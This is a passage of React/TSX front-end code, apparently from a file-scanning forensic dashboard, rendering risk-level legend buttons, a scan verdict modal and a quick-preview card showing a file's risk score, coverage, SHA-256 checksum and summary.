                      : 'border-slate-200 bg-slate-50/50 hover:bg-slate-100 hover:border-slate-300'
                  }`}
                >
                  <div className="flex items-center gap-3">
                    <div className="w-3 h-3 rounded-full shrink-0 shadow-xs" style={{ backgroundColor: item.color }} />
                    <div>
                      <div className="font-bold text-slate-900 text-sm">{item.name} Risk</div>
                      <div className="text-slate-500 text-xs mt-0.5">
                        {item.name === 'Critical' && 'Score 85–100 (Immediate Danger)'}
                        {item.name === 'High' && 'Score 60–84 (Threat Indicators)'}
                        {item.name === 'Medium' && 'Score 30–59 (Suspicious Anomaly)'}
                        {item.name === 'Low' && 'Score 0–29 (Safe & Harmless)'}
                      </div>
                    </div>
                  </div>
                  <div className="text-right pl-2">
                    <div className="font-mono font-bold text-slate-900 text-base">{item.value}</div>
                    <div className="text-xs text-slate-400 font-mono">{percent}%</div>
                  </div>
                </button>
              );
            })}
          </div>
        </div>
      </div>

      {/* POPUP MODAL: Clean File vs Warning on Threats (Explains what is the problem in the file) */}
      <ScanVerdictModal
        isOpen={scanPopupOpen}
        onClose={() => setScanPopupOpen(false)}
        verdict={scanVerdict}
        evidence={scanEvidence}
        onNavigateToDetails={onSelectInvestigation}
        onNavigateToDefense={onNavigateToDefense}
      />

      {/* QUICK PREVIEW POPUP CARD */}
      {quickPreviewInv && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-900/50 backdrop-blur-xs animate-in fade-in duration-150">
          <div className="bg-white border border-slate-200 rounded-3xl max-w-lg w-full p-6 space-y-4 shadow-2xl animate-in zoom-in-95 duration-150">
            <div className="flex items-center justify-between border-b border-slate-100 pb-3">
              <div className="flex items-center gap-3">
                <div className={`p-2.5 rounded-2xl ${
                  quickPreviewInv.risk_level === 'CRITICAL' ? 'bg-rose-50 text-rose-600 border border-rose-200' :
                  quickPreviewInv.risk_level === 'HIGH' ? 'bg-orange-50 text-orange-600 border border-orange-200' :
                  quickPreviewInv.risk_level === 'MEDIUM' ? 'bg-amber-50 text-amber-600 border border-amber-200' :
                  'bg-emerald-50 text-emerald-600 border border-emerald-200'
                }`}>
                  {quickPreviewInv.risk_level === 'LOW' ? <ShieldCheck className="w-5 h-5" /> : <ShieldAlert className="w-5 h-5" />}
                </div>
                <div>
                  <h3 className="text-sm font-bold text-slate-900 truncate max-w-[280px]">
                    {quickPreviewInv.original_name}
                  </h3>
                  <div className="text-[11px] text-slate-500">Forensic Investigation Snapshot</div>
                </div>
              </div>
              <button
                onClick={() => setQuickPreviewInv(null)}
                className="text-slate-400 hover:text-slate-700 p-1.5 rounded-lg hover:bg-slate-100 cursor-pointer"
              >
                <XCircle className="w-5 h-5" />
              </button>
            </div>

            <div className="space-y-3 text-xs">
              <div className="grid grid-cols-2 gap-2">
                <div className="p-3.5 rounded-2xl bg-slate-50 border border-slate-200">
                  <span className="text-[11px] text-slate-500 font-medium">Risk Score</span>
                  <div className="text-lg font-bold font-mono text-slate-900 mt-0.5">
                    {quickPreviewInv.risk_score} / 100
                  </div>
                  <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full inline-block mt-1 ${
                    quickPreviewInv.risk_level === 'CRITICAL' ? 'bg-rose-100 text-rose-700' :
                    quickPreviewInv.risk_level === 'HIGH' ? 'bg-orange-100 text-orange-700' :
                    quickPreviewInv.risk_level === 'MEDIUM' ? 'bg-amber-100 text-amber-700' :
                    'bg-emerald-100 text-emerald-700'
                  }`}>
                    {quickPreviewInv.risk_level}
                  </span>
                </div>
                <div className="p-3.5 rounded-2xl bg-slate-50 border border-slate-200">
                  <span className="text-[11px] text-slate-500 font-medium">Analysis Coverage</span>
                  <div className="text-lg font-bold font-mono text-slate-900 mt-0.5">
                    {((quickPreviewInv.coverage_score || 0.85) * 100).toFixed(0)}%
                  </div>
                  <span className="text-[10px] text-slate-400 mt-1 block">Full Forensic Pipeline</span>
                </div>
              </div>

              <div className="p-3 rounded-2xl bg-slate-50 border border-slate-200 space-y-1.5">
                <span className="text-[11px] font-bold text-slate-500 block">SHA-256 Checksum:</span>
                <div className="font-mono text-[10px] text-slate-800 break-all select-all bg-white p-2.5 rounded-xl border border-slate-200">
                  {quickPreviewInv.sha256}
                </div>
              </div>

              {quickPreviewInv.summary && (
                <div className="p-3.5 rounded-2xl bg-slate-50 border border-slate-200 text-slate-700">
                  <span className="text-slate-500 font-bold block text-[11px] mb-0.5">Assessment Summary:</span>
                  <p className="line-clamp-3 text-[11px] leading-relaxed">{quickPreviewInv.summary}</p>
                </div>
              )}
            </div>

            <div className="flex items-center justify-end gap-2 pt-3 border-t border-slate-100">
              <button
                onClick={() => setQuickPreviewInv(null)}
                className="px-4 py-2 rounded-xl bg-slate-100 hover:bg-slate-200 text-slate-700 text-xs font-semibold cursor-pointer"
              >
                Close
              </button>
              <button
                onClick={() => {
                  const id = quickPreviewInv.id;
                  setQuickPreviewInv(null);
                  onSelectInvestigation(id);
                }}
                className="px-4 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-semibold cursor-pointer shadow-sm"
              >
                Open Full Findings →
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
